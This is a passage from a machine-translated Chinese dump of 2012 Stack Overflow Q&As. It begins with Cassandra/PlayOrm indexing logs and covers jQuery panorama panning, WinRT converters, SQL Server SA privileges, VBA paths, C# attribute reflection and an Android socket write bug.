CF=DboColumnMeta index persist(cf=[tablename=DboColumnMeta])=[rowkey=/DboColumnMeta/columnName][indexval=nameToField,to pk=DboTableMeta:nameToField]
CF=[tablename=DboColumnMeta] persist rowkey=DboTableMeta:nameToField
CF=DboColumnMeta index persist(cf=[tablename=DboColumnMeta])=[rowkey=/DboColumnMeta/owner][indexval=DboTableMeta,to pk=DboTableMeta:colNamePrefixType]
CF=DboColumnMeta index persist(cf=[tablename=DboColumnMeta])=[rowkey=/DboColumnMeta/columnName][indexval=colNamePrefixType,to pk=DboTableMeta:colNamePrefixType]
CF=[tablename=DboColumnMeta] persist rowkey=DboTableMeta:colNamePrefixType
CF=DboColumnMeta index persist(cf=[tablename=DboColumnMeta])=[rowkey=/DboColumnMeta/owner][indexval=DboTableMeta,to pk=DboTableMeta:colNameType]
CF=DboColumnMeta index persist(cf=[tablename=DboColumnMeta])=[rowkey=/DboColumnMeta/columnName][indexval=colNameType,to pk=DboTableMeta:colNameType]
CF=[tablename=DboColumnMeta] persist rowkey=DboTableMeta:colNameType
CF=DboColumnMeta index persist(cf=[tablename=DboColumnMeta])=[rowkey=/DboColumnMeta/owner][indexval=DboTableMeta,to pk=DboTableMeta:isEmbeddable]
CF=DboColumnMeta index persist(cf=[tablename=DboColumnMeta])=[rowkey=/DboColumnMeta/columnName][indexval=isEmbeddable,to pk=DboTableMeta:isEmbeddable]
CF=[tablename=DboColumnMeta] persist rowkey=DboTableMeta:isEmbeddable
CF=DboColumnMeta index persist(cf=[tablename=DboColumnMeta])=[rowkey=/DboColumnMeta/owner][indexval=DboTableMeta,to pk=DboTableMeta:actualColFamily]
CF=DboColumnMeta index persist(cf=[tablename=DboColumnMeta])=[rowkey=/DboColumnMeta/columnName][indexval=actualColFamily,to pk=DboTableMeta:actualColFamily]
CF=[tablename=DboColumnMeta] persist rowkey=DboTableMeta:actualColFamily
CF=DboColumnMeta index persist(cf=[tablename=DboColumnMeta])=[rowkey=/DboColumnMeta/owner][indexval=DboTableMeta,to pk=DboTableMeta:foreignKeyToExtensions]
CF=DboColumnMeta index persist(cf=[tablename=DboColumnMeta])=[rowkey=/DboColumnMeta/columnName][indexval=foreignKeyToExtensions,to pk=DboTableMeta:foreignKeyToExtensions]
CF=[tablename=DboColumnMeta] persist rowkey=DboTableMeta:foreignKeyToExtensions
CF=DboColumnMeta index persist(cf=[tablename=DboColumnMeta])=[rowkey=/DboColumnMeta/owner][indexval=DboTableMeta,to pk=DboTableMeta:idColumn]
CF=DboColumnMeta index persist(cf=[tablename=DboColumnMeta])=[rowkey=/DboColumnMeta/columnName][indexval=idColumn,to pk=DboTableMeta:idColumn]
CF=[tablename=DboColumnMeta] persist rowkey=DboTableMeta:idColumn
CF=DboColumnMeta index persist(cf=[tablename=DboColumnMeta])=[rowkey=/DboColumnMeta/owner][indexval=DboTableMeta,to pk=DboTableMeta:columnFamily]
CF=DboColumnMeta index persist(cf=[tablename=DboColumnMeta])=[rowkey=/DboColumnMeta/columnName][indexval=columnFamily,to pk=DboTableMeta:columnFamily]
CF=[tablename=DboColumnMeta] persist rowkey=DboTableMeta:columnFamily
CF=DboTableMeta index persist(cf=[tablename=DboTableMeta])=[rowkey=/DboTableMeta/columnFamily] (table found, colmeta not found)
CF=[tablename=DboTableMeta] persist rowkey=DboTableMeta
CF=DboColumnMeta index persist(cf=[tablename=DboColumnMeta])=[rowkey=/DboColumnMeta/owner][indexval=DboDatabaseMeta,to pk=DboDatabaseMeta:colFamilyToMeta]
CF=DboColumnMeta index persist(cf=[tablename=DboColumnMeta])=[rowkey=/DboColumnMeta/columnName][indexval=colFamilyToMeta,to pk=DboDatabaseMeta:colFamilyToMeta]
CF=[tablename=DboColumnMeta] persist rowkey=DboDatabaseMeta:colFamilyToMeta
CF=DboColumnMeta index persist(cf=[tablename=DboColumnMeta])=[rowkey=/DboColumnMeta/owner][indexval=DboDatabaseMeta,to pk=DboDatabaseMeta:id]
CF=DboColumnMeta index persist(cf=[tablename=DboColumnMeta])=[rowkey=/DboColumnMeta/columnName][indexval=id,to pk=DboDatabaseMeta:id]
CF=[tablename=DboColumnMeta] persist rowkey=DboDatabaseMeta:id
CF=DboTableMeta index persist(cf=[tablename=DboTableMeta])=[rowkey=/DboTableMeta/columnFamily] (table found, colmeta not found)
CF=[tablename=DboTableMeta] persist rowkey=DboDatabaseMeta
CF=DboColumnMeta index persist(cf=[tablename=DboColumnMeta])=[rowkey=/DboColumnMeta/owner][indexval=StringIndice,to pk=StringIndice:id]
CF=DboColumnMeta index persist(cf=[tablename=DboColumnMeta])=[rowkey=/DboColumnMeta/columnName][indexval=id,to pk=StringIndice:id]
CF=[tablename=DboColumnMeta] persist rowkey=StringIndice:id
CF=DboTableMeta index persist(cf=[tablename=DboTableMeta])=[rowkey=/DboTableMeta/columnFamily] (table found, colmeta not found)
CF=[tablename=DboTableMeta] persist rowkey=StringIndice
CF=DboColumnMeta index persist(cf=[tablename=DboColumnMeta])=[rowkey=/DboColumnMeta/owner][indexval=DecimalIndice,to pk=DecimalIndice:id]
CF=DboColumnMeta index persist(cf=[tablename=DboColumnMeta])=[rowkey=/DboColumnMeta/columnName][indexval=id,to pk=DecimalIndice:id]
CF=[tablename=DboColumnMeta] persist rowkey=DecimalIndice:id
CF=DboTableMeta index persist(cf=[tablename=DboTableMeta])=[rowkey=/DboTableMeta/columnFamily] (table found, colmeta not found)
CF=[tablename=DboTableMeta] persist rowkey=DecimalIndice
CF=DboColumnMeta index persist(cf=[tablename=DboColumnMeta])=[rowkey=/DboColumnMeta/owner][indexval=IntegerIndice,to pk=IntegerIndice:id]
CF=DboColumnMeta index persist(cf=[tablename=DboColumnMeta])=[rowkey=/DboColumnMeta/columnName][indexval=id,to pk=IntegerIndice:id]
CF=[tablename=DboColumnMeta] persist rowkey=IntegerIndice:id
CF=DboTableMeta index persist(cf=[tablename=DboTableMeta])=[rowkey=/DboTableMeta/columnFamily] (table found, colmeta not found)
CF=[tablename=DboTableMeta] persist rowkey=IntegerIndice
CF=[tablename=DboDatabaseMeta] persist rowkey=nosqlorm
2012-10-25 17:43:57,168 com.alvazan.orm.layer9z.spi.db.cassandra.ColumnFamilyHelper tryToLoadColumnFamilyImpl
INFO: Column family NOT found in-memory=StringIndice, CHECK and LOAD from Cassandra if available
2012-10-25 17:43:57,169 com.alvazan.orm.layer9z.spi.db.cassandra.ColumnFamilyHelper loadFromInMemoryOrDb
INFO: looking up meta=StringIndice so we can add table to memory(one time operation)
2012-10-25 17:43:57,169 com.alvazan.orm.layer9z.spi.db.cassandra.ColumnFamilyHelper loadFromInMemoryOrDb
INFO: found meta=StringIndice locally
2012-10-25 17:43:57,170 com.alvazan.orm.layer9z.spi.db.cassandra.ColumnFamilyHelper tryToLoadColumnFamilyImpl
INFO: Virt CF=StringIndice already exists and real colfamily=StringIndice already exists so return it
2012-10-25 17:43:57,171 com.alvazan.orm.layer9z.spi.db.cassandra.ColumnFamilyHelper tryToLoadColumnFamilyVirt
INFO: Total time to LOAD column family meta from cassandra=3
2012-10-25 17:43:57,183 com.alvazan.orm.layer9z.spi.db.cassandra.ColumnFamilyHelper tryToLoadColumnFamilyImpl
INFO: Column family NOT found in-memory=DboColumnMeta, CHECK and LOAD from Cassandra if available
2012-10-25 17:43:57,183 com.alvazan.orm.layer9z.spi.db.cassandra.ColumnFamilyHelper loadFromInMemoryOrDb
INFO: looking up meta=DboColumnMeta so we can add table to memory(one time operation)
2012-10-25 17:43:57,184 com.alvazan.orm.layer9z.spi.db.cassandra.ColumnFamilyHelper loadFromInMemoryOrDb
INFO: found meta=DboColumnMeta locally
2012-10-25 17:43:57,184 com.alvazan.orm.layer9z.spi.db.cassandra.ColumnFamilyHelper tryToLoadColumnFamilyImpl
INFO: Virt CF=DboColumnMeta already exists and real colfamily=DboColumnMeta already exists so return it
2012-10-25 17:43:57,184 com.alvazan.orm.layer9z.spi.db.cassandra.ColumnFamilyHelper tryToLoadColumnFamilyVirt
INFO: Total time to LOAD column family meta from cassandra=1
2012-10-25 17:43:57,187 com.alvazan.orm.layer9z.spi.db.cassandra.ColumnFamilyHelper tryToLoadColumnFamilyImpl
INFO: Column family NOT found in-memory=DboTableMeta, CHECK and LOAD from Cassandra if available
2012-10-25 17:43:57,188 com.alvazan.orm.layer9z.spi.db.cassandra.ColumnFamilyHelper loadFromInMemoryOrDb
INFO: looking up meta=DboTableMeta so we can add table to memory(one time operation)
2012-10-25 17:43:57,188 com.alvazan.orm.layer9z.spi.db.cassandra.ColumnFamilyHelper loadFromInMemoryOrDb
INFO: found meta=DboTableMeta locally
2012-10-25 17:43:57,188 com.alvazan.orm.layer9z.spi.db.cassandra.ColumnFamilyHelper tryToLoadColumnFamilyImpl
INFO: Virt CF=DboTableMeta already exists and real colfamily=DboTableMeta already exists so return it
2012-10-25 17:43:57,189 com.alvazan.orm.layer9z.spi.db.cassandra.ColumnFamilyHelper tryToLoadColumnFamilyVirt
INFO: Total time to LOAD column family meta from cassandra=2
2012-10-25 17:43:57,294 com.alvazan.orm.logging.NoSqlRawLogger sendChanges
INFO: [rawlogger] Sending Changes to server took(including spi plugin)=131 ms
2012-10-25 17:43:57,296 com.alvazan.orm.layer0.base.BaseEntityManagerFactoryImpl rescan
INFO: Finished saving meta data, complelety done initializing
2012-10-25 17:43:57,297 com.alvazan.orm.logging.NoSqlRawLogger logColScanImpl
INFO: [rawlogger]CF=[tablename=User] index=/User/cpf(in CF=StringIndice) scanning index for value in range:ALL DATA with batchSize=null
2012-10-25 17:43:57,307 com.alvazan.orm.layer9z.spi.db.cassandra.ColumnFamilyHelper tryToLoadColumnFamilyImpl
INFO: Column family NOT found in-memory=User, CHECK and LOAD from Cassandra if available
2012-10-25 17:43:57,308 com.alvazan.orm.layer9z.spi.db.cassandra.ColumnFamilyHelper loadFromInMemoryOrDb
INFO: looking up meta=User so we can add table to memory(one time operation)
2012-10-25 17:43:57,308 com.alvazan.orm.layer9z.spi.db.cassandra.ColumnFamilyHelper loadFromInMemoryOrDb
INFO: found meta=User locally
2012-10-25 17:43:57,309 com.alvazan.orm.layer9z.spi.db.cassandra.ColumnFamilyHelper tryToLoadColumnFamilyImpl
INFO: Virt CF=User already exists and real colfamily=User already exists so return it
2012-10-25 17:43:57,309 com.alvazan.orm.layer9z.spi.db.cassandra.ColumnFamilyHelper tryToLoadColumnFamilyVirt
INFO: Total time to LOAD column family meta from cassandra=2
2012-10-25 17:43:57,359 com.alvazan.orm.logging.LogBatchFetch logInfo
INFO: [rawlogger]CF=[tablename=User] index=/User/cpf Index slice took=47 ms for batchSize=all numFetched=3
2012-10-25 17:43:57,430 com.alvazan.orm.logging.LogBatchFetch logInfo
INFO: [rawlogger]CF=[tablename=User] Find took=67 ms for batchSize=500 numFetched=3
2012-10-25 17:43:57,441 com.alvazan.orm.logging.NoSqlRawLogger logColScanImpl
INFO: [rawlogger]CF=[tablename=User] index=/User/activitiesCursor/1(in CF=StringIndice) scanning index for value in range:ALL DATA with batchSize=200
indexing user 1
2012-10-25 17:43:57,588 org.apache.solr.client.solrj.impl.HttpClientUtil createClient
INFO: Creating new http client, config:maxConnections=128&maxConnectionsPerHost=32&followRedirects=false
2012-10-25 17:44:03,495 com.alvazan.orm.logging.NoSqlRawLogger logColScanImpl
INFO: [rawlogger]CF=[tablename=User] index=/User/activitiesCursor/12656382709:devel-PowerEdge-1850(in CF=StringIndice) scanning index for value in range:ALL DATA with batchSize=200
indexing user 12656382709:devel-PowerEdge-1850
2012-10-25 17:44:03,645 com.alvazan.orm.logging.NoSqlRawLogger logColScanImpl
INFO: [rawlogger]CF=[tablename=User] index=/User/activitiesCursor/5a353a6f-62cc-4fd3-a58b-8ee1cc01bed3(in CF=StringIndice) scanning index for value in range:ALL DATA with batchSize=200
indexing user 5a353a6f-62cc-4fd3-a58b-8ee1cc01bed3 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-26T12:20:52.530

好吧，当您实际保存这些实体时，日志丢失了。我假设您正在通过 PlayOrm api 保存所有实体，对吗？但是用户必须已经保存在系统的另一次运行中，而不是这次运行或者我会看到其他日志并且可以分析以查看是否存在问题。

注意：另一个原因是如果您在添加 @NoSqlIndexed 注释之前将实体放入。让每个实体至少有一个带有 @NoSqlIndexed 注释的字段总是好的，这样您就可以使用命令行工具从另一个索引重新索引。

您还可以使用命令行工具查看索引以查看其内容。

# jquery - 在 BG 中平移 Panaroma 图片

> ID：13076135
> 
> 赞同：1
> 
> 时间：2012-10-25T19:51:01.177
> 
> 标签：jquery, css, animation

我正在为一家餐馆做一个网站。业主拍了一张内部的全景照片，并希望它在网站的 BG 平移/浏览全景图上。所以基本上 panaroma 将是 BG 并且需要在图像上旋转或平移。这可能吗？我在想也许可以使用某种 jQuery 来改变图像在慢动作中的位置或其他东西，但并不是每个 jQuery 都足以提供所需的代码。我几乎求助于 animate.css 但我至少需要 IE8 及更高版本的浏览器兼容性。

提前致谢。:)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-25T20:08:32.303

这是穷人的版本：

```
​.slide {
 height:160px;
 width:50px;
 background-position:160px 0;    
 background-image:url(http://i.imgur.com/vdDQgb.jpg)  
} 
```

HTML：

```
<div class="slide"></div>
<div id="num"></div> 
```

JS：

```
var limit = 60;
var start = 120;    
var moveBy = 1;    
var timer1 = setInterval(function() {  
    $('#num').text(start);
    $('.slide').css('background-position',start+'px 0') ;
    start--;
    if(start<0) {
       alert("done"); 
       clearTimeout(timer1);
    }    
},50) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-25T20:04:25.090

为了让它在现代浏览器中流畅地平移，你真的应该看看画布，因为它支持“半”像素。我知道这在 IE8 中不起作用，但跳跃整个像素和在它们之间插值之间的差异是巨大的。请参阅[http://www.willmcgugan.com/blog/tech/2011/2/26/ken-burns-effect-with-javascript-and-canvas/](http://www.willmcgugan.com/blog/tech/2011/2/26/ken-burns-effect-with-javascript-and-canvas/)了解画布中 ken Burns 效果的一些示例 javascript (jQuery)。

也许 IE8 的非画布后备将是一个选项，例如通过更改顶部和左侧 css 属性来移动相对定位的图像？

# c# - WinRT 中的数据触发器

> ID：13076146
> 
> 赞同：2
> 
> 时间：2012-10-25T19:51:37.097
> 
> 标签：c#, windows-8, microsoft-metro

据我了解，WinRT 不支持 DataTriggers。但是，如何解决这个问题？

我有一个实现了“选定”属性的模型，扩展了 INotifyPropertyChanged。如果 Selected 为 True，我想将按钮的边框更改为红色。我只是不知道如何将属性更改链接到触发状态更改。

**模型**

```
class MyObject : INotifyPropertyChanged
{
    public MyObject()
    {
        Selected = true;
    }

    private bool _selected;

    public bool Selected
    {
        get { return _selected; }
        set { _selected = value; OnPropertyChanged("Selected"); }
    }

    public event PropertyChangedEventHandler PropertyChanged;

    protected virtual void OnPropertyChanged(string propertyName)
    {
        PropertyChangedEventHandler handler = PropertyChanged;
        if (handler != null) handler(this, new PropertyChangedEventArgs(propertyName));
    }
} 
```

**XAML**

```
<Grid>
    <Button Margin="131,97,171,124" Content="Hello!" DataContext="MyObject" d:DataContext="{d:DesignInstance local:MyObject}">
        <Button.Template>
            <ControlTemplate TargetType="Button">
                <Border BorderThickness="1">
                    <Border.BorderBrush>
                        <SolidColorBrush Color="Aqua"/>
                    </Border.BorderBrush>
                    <StackPanel>
                        <TextBlock Text="{TemplateBinding Content}"/>
                        <TextBlock Text="{Binding Selected}"/>
                    </StackPanel>
                </Border>
            </ControlTemplate>
        </Button.Template>
    </Button>
</Grid> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T21:55:47.607

您可以使用简单的转换器 ( `IValueConverter`)。然后将边框属性绑定到`Selected`ViewModel 中的属性：

```
<Border BorderBrush="{Binding Selected, Converter={StaticResource MyConverter}}"> 
```

您当然需要在 Page 资源或 App 资源字典中的某个位置放置资源：

```
<mynamespace:MyConverter x:Key="MyConverter"/> 
```

然后在转换器中，检查值是否为`True`并返回红色画笔

（我只是很快写了这个，没有测试它，但你也可以谷歌如何轻松地做这些东西）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-27T06:21:08.410

您可能会看到一个端口。 [https://nuget.org/packages/Windows.UI.Interactivity](https://nuget.org/packages/Windows.UI.Interactivity)

[https://github.com/jlaanstra/Windows.UI.Interactivity](https://github.com/jlaanstra/Windows.UI.Interactivity)

# sql-server-2008-r2 - 拥有系统管理员之外的 SA 帐户

> ID：13076149
> 
> 赞同：0
> 
> 时间：2012-10-25T19:51:51.423
> 
> 标签：sql-server-2008-r2, sql-server-2000, sa

我们有很多脚本和应用程序使用 SA 帐户连接到 SQL 2000。我们也有很多人使用 SA 帐户直接从他们的电台连接。

我们需要迁移到 2008r2，但我们不能让这些用户拥有特权帐户，并且我们不想更改所有连接。

我们无法从 SysAdmin 中删除 SA，因为 SQL 不允许我们这样做。我们有什么办法可以在不更改所有连接的情况下删除特权？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-25T20:01:56.647

您可以将实际 SA 帐户重命名为 SA_RENAMED，然后创建一个没有权限的新 SA 帐户。

您可能需要在其中一个脚本中查找 SA 密码并立即对其进行测试。

然后，您可以更改 SA_RENAMED 密码或禁用它。

注意1：您可能必须调试一些确实需要系统管理员权限的脚本。您应该首先在 TEST 环境中尝试。

注意2：当它被操作支持时，这样做也可能会造成很多混乱。在印度提供支持的大型公司中，您需要一个良好的沟通计划。

# html - HTML 模板框架可以让你在没有 javascript 的情况下包含部分内容？

> ID：13076151
> 
> 赞同：2
> 
> 时间：2012-10-25T19:51:56.213
> 
> 标签：html, templates, template-engine

在使用代码进行设计时，我经常需要跨多个页面的元素，例如菜单，我想将它存储在模板中。如果我使用 Jade，我可以将该模板包含到任何文件中，命令行 Jade 编译器会将其吐回。我不必编写任何 JavaScript 或传递上下文或任何东西，我只需获得模板化标记。

是否有提供相同功能但使用纯 HTML 的工具？不需要某种服务器，也不需要一堆 JS 函数？我看过 Mustache、Handlebars 和 Underscore，但它们都要求我将模板转换为函数并使用上下文调用它。我只需要在多个页面上复制 HTML。

**更新**

为了澄清，我正在寻找一个命令行工具来编译 html 文件中的部分

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-20T07:12:15.060

看看[韦比](http://webby.rubyforge.org/)。

*   > 部署在任何地方——它只是 HTML，不需要特殊的服务器内容

*   > Webby 是一个很棒的小型网站管理系统。如果它是一个更大的孩子，它将被称为内容管理系统。但是，它只是一个具有转换文本特殊技巧的矮子。这就是它所做的一切——管理将文本转换成其他东西的繁琐工作，如果你愿意的话，它是一个 ASCII 炼金术士。
    > 
    > Webby 的工作原理是将页面内容与布局相结合以生成 HTML。布局包含所有页面共有的所有内容——HTML 标题、导航菜单、页脚等——并且页面只包含该页面的信息。您可以使用您喜欢的标记语言来编写您的页面；Webby 支持不少。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-25T20:41:37.593

如果您正在寻找模板化的 HTML，不使用任何服务器端逻辑，并且在客户端没有任何逻辑（即：JS），那么答案是否定的。

真的，到那时，你只剩下复制/粘贴了。

HTML 是 100% 静态的，您一次只能请求一个 URL，因此您只剩下一个静态页面。

如果我误解了，并且您想知道如何在 JS 中进行模板化，但想要一些更简单的东西，您的模板会在其中下载 HTML 模板，通读它并填写空白......或者如果您正在寻找一些模板服务器端的其他语言，请随时纠正我。

# vba - 在 VBA 代码中使用单元格中的数据打开目录

> ID：13076152
> 
> 赞同：0
> 
> 时间：2012-10-25T19:51:56.480
> 
> 标签：vba, excel, excel-2007

改写我的问题：

```
Sub Path()
Dim path As Range
Dim shPivot As Worksheet
Set shPivot = ActiveWorkbook.Sheets("Pivot")
Set path = shPivot.Range("E12").Value
Set wkbFrom = Workbooks.Open("S:\_Supply Chain\Weekly Rpts Supplier and Buyer\" & path & "\SUPPLIER_01_00028257_KIK CUSTOM PRODUCTS GAINSVILLE_21-OCT-12.xls") 
```

路径是单元格中的日期。当此单元格更改时，我希望目录根据路径更改。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-25T19:59:42.313

两件事情

1.  将路径声明为字符串而不是范围。
2.  在路径中使用之前替换日期中的“\”

这是你正在尝试的吗？

```
Dim path As String
path = shPivot.Range("E12").Value
Set wkbFrom = Workbooks.Open("S:\_Supply Chain\Weekly Rpts Supplier and Buyer\" & _
              format(path,"DD-MM-YYYY") & _
              "\SUPPLIER_01_00028257_KIK CUSTOM PRODUCTS GAINSVILLE_21-OCT-12.xls") 
```

**跟进**

在这种情况下使用这个

```
Dim path As String
path = shPivot.Range("E12").Value
Set wkbFrom = Workbooks.Open("S:\_Supply Chain\Weekly Rpts Supplier and Buyer\" & _
              path & _
              "\SUPPLIER_01_00028257_KIK CUSTOM PRODUCTS GAINSVILLE_21-OCT-12.xls") 
```

如果有任何不需要的空格，那么您将不得不使用`TRIM`

```
Dim path As String
path = shPivot.Range("E12").Value
Set wkbFrom = Workbooks.Open("S:\_Supply Chain\Weekly Rpts Supplier and Buyer\" & _
              Trim(path) & _
              "\SUPPLIER_01_00028257_KIK CUSTOM PRODUCTS GAINSVILLE_21-OCT-12.xls") 
```

# javascript - Javascript中的多字段模式输入对话框

> ID：13076154
> 
> 赞同：0
> 
> 时间：2012-10-25T19:52:01.793
> 
> 标签：javascript, user-interface, input, dojo, modal-dialog

我正在开发一个允许用户设置属性值的 Javascript 小部件。默认情况下，用户通过将值输入到文本字段（html 输入）中来输入值，但我需要允许用户将输入方式更改为滑块控件。当用户更改为滑块控件时，我需要允许他们设置滑块的最小值和最大值（并可能做出其他选择）。由于我需要用户输入多个值，我无法使用提示对话框。我能做些什么呢？我们在这个项目中使用 Dojo，所以 Dojo 解决方案会很棒，但我愿意使用任何其他与 Dojo 配合得很好的库。

# c# - 在不知道属性类型的情况下从属性和列表值中获取属性值

> ID：13076158
> 
> 赞同：8
> 
> 时间：2012-10-25T19:52:10.310
> 
> 标签：c#, reflection, properties, custom-attributes

我想传入属性名称并返回值。这将在通用工具中，并且它不知道属性类型。

**更新** 如果有人需要这样做，这是实际的工作代码。我需要一种方法让核心代码在不知道它们是什么的情况下解析属性。

```
public void LoadPropertiesToGrid(BaseGridPropertyModel model)
{
    foreach (PropertyInfo prop in ReflectionUtil.FindPublicPropeties(model))
    {
        object editTyp = ReflectionUtil.GetPropertyAttributes(prop, "EditorType"); 
        object rowIdx = ReflectionUtil.GetPropertyAttributes(prop, "ColIndex");
        object name = ReflectionUtil.GetPropertyAttributes(prop, "Name");
        object visible = ReflectionUtil.GetPropertyAttributes(prop, "Visible");
        ConfigureColumn((string) name, (int) rowIdx, (bool) visible, (string) editTyp);
     }
}
[Serializable]
public class CanvasPropertiesViewModel : BaseGridPropertyModel
{
    [PropertiesGrid(Name = "TEsting Name 0", ColIndex = 0)]
    public string StringData1 { get; set; }

    [PropertiesGrid(Name = "TEsting Name 2", ColIndex = 2)]
    public string StringData2 { get; set; }

    [PropertiesGrid(Name = "TEsting Name 1", ColIndex = 1)]
    public string StringData3 { get; set; }
}
[AttributeUsage(AttributeTargets.All, Inherited = false, AllowMultiple = true)]
public sealed class PropertiesGridAttribute : Attribute
{
    /// <summary>
    /// Editor type
    /// </summary>
    public Type EditorType { get; set; }

    /// <summary>
    /// Sets Column Index
    /// </summary>
    public int ColIndex { get; set; }

    /// <summary>
    /// Visible to Grid
    /// </summary>
    public bool Visible { get; set; }

    /// <summary>
    /// Dispaly Name of the property
    /// </summary>
    public string Name { get; set; }
}
public static object GetPropertyAttributes(PropertyInfo prop, string attributeName)
{
    // look for an attribute that takes one constructor argument
    foreach (CustomAttributeData attribData in prop.GetCustomAttributesData())
    {
        string typeName = attribData.Constructor.DeclaringType.Name;
        //if (attribData.ConstructorArguments.Count == 1 && (typeName == attributeName || typeName == attributeName + "Attribute"))
        //{
        //    return attribData.ConstructorArguments[0].Value;
        //}
        foreach (CustomAttributeNamedArgument att in attribData.NamedArguments)
        {
            if(att.GetPropertyValue<string>("MemberName") == attributeName)
            {
                return att.TypedValue.Value;
            }
        }
    }
    return null;
}

//PropertyExpressionParser 
public static TRet GetPropertyValue<TRet>(this object obj, string propertyPathName)
{
    if (obj == null)
    {
        throw new ArgumentNullException("obj");
    }

    string[] parts = propertyPathName.Split('.');
    string path = propertyPathName;
    object root = obj;

    if (parts.Length > 1)
    {
        path = parts[parts.Length - 1];
        parts = parts.TakeWhile((p, i) => i < parts.Length - 1).ToArray();
        string path2 = String.Join(".", parts);
        root = obj.GetPropertyValue<object>(path2);
    }

    var sourceType = root.GetType();
    var value = (TRet)sourceType.GetProperty(path).GetValue(root, null);
    return value;
} 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-10-25T20:05:49.607

如果你的意思是“给定一个带有一个参数的属性，给我那个值”，例如：

```
[DisplayName("abc")] <===== "abc"
[Browsable(true)] <===== true 
```

那么这在 .NET 4.5 中是最简单的，通过新的`CustomAttributeData`API：

```
using System.ComponentModel;
using System.Reflection;

public static class Program
{
    static void Main()
    {
        PropertyInfo prop = typeof(Foo).GetProperty("Bar");
        var val = GetPropertyAttributes(prop, "DisplayName");
    }
    public static object GetPropertyAttributes(PropertyInfo prop, string attributeName)
    {
        // look for an attribute that takes one constructor argument
        foreach(CustomAttributeData attribData in prop.GetCustomAttributesData()) 
        {
            string typeName = attribData.Constructor.DeclaringType.Name;
            if(attribData.ConstructorArguments.Count == 1 &&
                (typeName == attributeName || typeName == attributeName + "Attribute"))
            {
                return attribData.ConstructorArguments[0].Value;
            }
        }
        return null;
    }
}

class Foo
{
    [DisplayName("abc")]
    public string Bar { get; set; }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-25T20:04:10.340

*正如马克所说，属性本身*没有值。但是，您可以使用您为每个自定义属性实现的 Value 属性创建一个接口。然后您所要做的就是验证属性是否实现了您的接口，然后获取值。

例子：

```
public static object GetPropertyAttributes(PropertyInfo prop, string attributeName)
{
    object[] attrs = prop.GetCustomAttributes(true);

    foreach (object attr in attrs)
    {
        //THIS SHOULD BE REFLECTION
        if (attr is IMyCustomAttribute) // check if attr implements interface (you may have to reflect to get this)
        {
            return (attr as IMyCustomAttribute).Value
        }

    }
}

// Your interface
public interface IMyCustomAttribute
{
    object Value { get; set; }
}

// Attribute implementing interface
public SomeCustomAttribute : Attribute, IMyCustomAttribute
{
    object Value { get; set; }

    // Other attribute code goes here
} 
```

# java - OutputStream.write() 成功但数据未下发

> ID：13076162
> 
> 赞同：9
> 
> 时间：2012-10-25T19:52:36.713
> 
> 标签：java, android, network-programming, java-io

在写入套接字期间，我有一个非常奇怪的行为。在我的移动客户端中，我使用了一个初始化如下的套接字：

```
private void initSocket()
{
    socket = new Socket();
    socket.connect(new InetSocketAddress(host, port));

    os = new DataOutputStream(socket.getOutputStream());
    is = new DataInputStream(socket.getInputStream());
} 
```

然后定期（每 60 秒）我向这个套接字读取和写入一些数据（这里的代码稍微简化了一点）：

```
if(!isSocketInitialized())
{
    initSocket();
}

byte[] msg = getMessage();

os.write(msg);
os.flush();

int bytesAvailable = is.available( );
if(bytesAvailable>0)
{
    byte[] inputBuffer = new byte[bytesAvailable];

    int numRead = is.read(inputBuffer, 0, bytesAvailable);
    processServerReply(inputBuffer, numRead);
} 
```

它有效。但是...有时（非常罕见，可能每天 1 或 2 次）我的服务器不接收数据。我的客户日志如下所示：

```
Written A
Written B
Written C
Written D
Written E 
```

等等。但在服务器端它看起来像：

```
Received A
Received E 
```

没有收到 B、C、D 数据记录，尽管事实上在客户端看起来所有数据都毫无例外地发送了！

这样的差距可能很小（2-3 分钟），这不是很糟糕，但有时它们可​​能非常大（1-2 小时 = 60-120 个周期），这对我的客户来说确实是个问题。

我真的不知道有什么问题。数据似乎是由客户端发送的，但它从未到达服务器端。我也用代理检查过它。

我只有日志，无法重现此问题（但我的客户每天都会发生不止一次），有时我会在日志中看到连接中断并出现异常“sendto failed: ECONNRESET (Connection reset by peer )”。之后程序关闭套接字，重新初始化它：

```
// close
is.close();
os.close();
socket.close();

// reinitialize
initSocket(); 
```

并尝试如上所述再次写入数据。然后我看到了问题：连接建立，写入成功，但是没有数据到达服务器！

可能与 ECONNRESET 有关系，可能不是，但我想提一下，因为它可能很重要。

我将非常感谢任何想法和提示。

PS也许它起到了一些作用：客户端代码在移动的Android移动设备上运行（它在汽车中）。互联网连接是通过 GPRS 建立的。

* * *

UPD：我可以重现它！至少部分（客户端发送 A、B、C、D、E 而服务器只接收 A）。每次都会发生，如果：

1.  连接建立，客户端读写->OK

2.  连接丢失（我关闭了我的 WLAN 路由器 :)），我变成了 IOException，我关闭了流和套接字 -> OK

3.  我打开路由器，连接恢复，我再次初始化套接字，程序执行 write() 无异常，但是......没有数据到达服务器。

顺便说一句，因为连接再次返回，available() 总是返回 0。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-25T22:23:46.610

摆脱`available()`测试。如果对方要回复，请阅读它。否则，有时您会阅读回复，有时则不会，并且您会失去同步。的正确用法很少`available()`，这不是其中之一。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-19T18:19:33.787

这种奇怪行为的原因是服务器端未关闭的套接字。我可以用小型客户端和服务器重现它。两者都包含几行代码，它们执行以下操作：

1.  连接到服务器
2.  模拟死角（例如关闭 WiFi）
3.  关闭客户端的套接字
4.  不要关闭服务器端的套接字
5.  打开你的 WiFi
6.  从客户端建立新连接
7.  将数据写入此连接

瞧！客户端写入数据没有任何错误，但服务器没有收到它......

但是如果服务器也关闭了套接字，那么服务器就可以读取这些数据。所以解决方案应该是在服务器端超时后关闭套接字。

不幸的是，在我的情况下它是不可行的，因为服务器是专有的第三方软件。

# c# - 使用按钮从 GridView 和 DB 中删除记录

> ID：13076166
> 
> 赞同：4
> 
